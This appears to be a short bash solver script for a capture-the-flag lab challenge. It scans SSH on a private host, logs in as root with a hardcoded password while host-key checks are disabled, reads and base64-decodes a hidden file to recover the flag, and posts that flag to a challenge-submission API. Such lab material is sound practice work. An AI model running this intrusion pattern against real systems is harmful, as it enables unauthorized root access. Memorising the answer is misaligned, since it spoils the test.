#!/usr/bin/env bash
set -euo pipefail

HOST='172.20.0.141'
LOGIN='root'
PASSWORD='NeonRunner-7F'
CHALLENGE_ID='scl-challenge-frame-a1bf10'

nmap -Pn -p 22 "$HOST" >/dev/null
encoded="$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no "$LOGIN@$HOST" 'cat /var/tmp/.runner-telemetry')"
flag="$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.read()).decode())')"
payload="$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$flag")"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
printf '\n'
